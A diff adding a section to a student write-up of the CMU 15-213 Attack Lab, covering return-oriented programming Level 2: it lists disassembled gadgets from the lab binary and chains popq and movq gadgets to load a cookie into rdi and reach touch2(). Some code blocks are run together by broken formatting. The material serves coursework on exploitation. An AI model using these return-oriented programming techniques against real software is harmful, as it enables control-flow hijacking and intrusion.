@@ -326,6 +326,35 @@ We finally pass the test:
 
 ##	Part II: Return-Oriented Programming
 
+![Gadget_Table](pic/Gadget_Table.png)
+<p align="center">Table 1. Gadget Table(picture from the write of attack lab of CMU-15213)</p></br>
+
 ###  2.1 Level 2
+Just like what we did in phase2(CI-Level2), we need to store the cookie value into rdi and then jump to `touch2()`.
+
+```asmmovq  $0x59b997fa,%rdi ; make rdi store our cookie value
+pushq $0x4017ec ; push the address of touch 2 into the stackretq ; return to touch2()
+```
+
+However, as we described above, due to ASLR (Address Space Layout Randomization) and non-executable code segments, we cannot directly inject code as in the previous section. Instead, we can use RoP to collect the existing gadgets in the current program and link them together to achieve our goal, where the gadget is actually a sequence of "hexadecimal codes" that representing executable assembly code.
+
+It is hard to achieve the assembly code like above, but we can change the assembly code fits for the current program but still can achieve our goal. According the hint from **write up**, the gadget in this phase can be found in the region of the code for `rtarget` demarcated by the functions `start_farm` and `mid_farm` and the assembly instructions will be restricted to `movq`, `popq`, `nop` and `ret` instructions. 
+
+Avaliable gadget from `farm` or dissasemble by `rtarget`:
+
+```asm
+0000000000401994 <start_farm>:  401994:	b8 01 00 00 00       	mov    $0x1,%eax  401999:	c3                   	retq   000000000040199a <getval_142>:  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax  40199f:	c3                   	retq   00000000004019a0 <addval_273>:  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax  4019a6:	c3                   	retq   00000000004019a7 <addval_219>:  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax  4019ad:	c3                   	retq   00000000004019ae <setval_237>:  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)  4019b4:	c3                   	retq   00000000004019b5 <setval_424>:  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)  4019bb:	c3                   	retq   00000000004019bc <setval_470>:  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)  4019c2:	c3                   	retq   00000000004019c3 <setval_426>:  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)  4019c9:	c3                   	retq   00000000004019ca <getval_280>:  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax  4019cf:	c3                   	retq   00000000004019d0 <mid_farm>:  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax  4019d5:	c3                   	retq 
+```
+
+We can change our assembly code like this:
+
+```asm
+// First gadget
+popq %rax// the next 8 bytes must be the cookie value to save in %rax
+ret // jump to the second gadget
+// Second gadget
+movq	%rax, %rdi // move cookie value to rdi
+ret // jump to touch 2
+```
 
 ###  2.2 Level 3
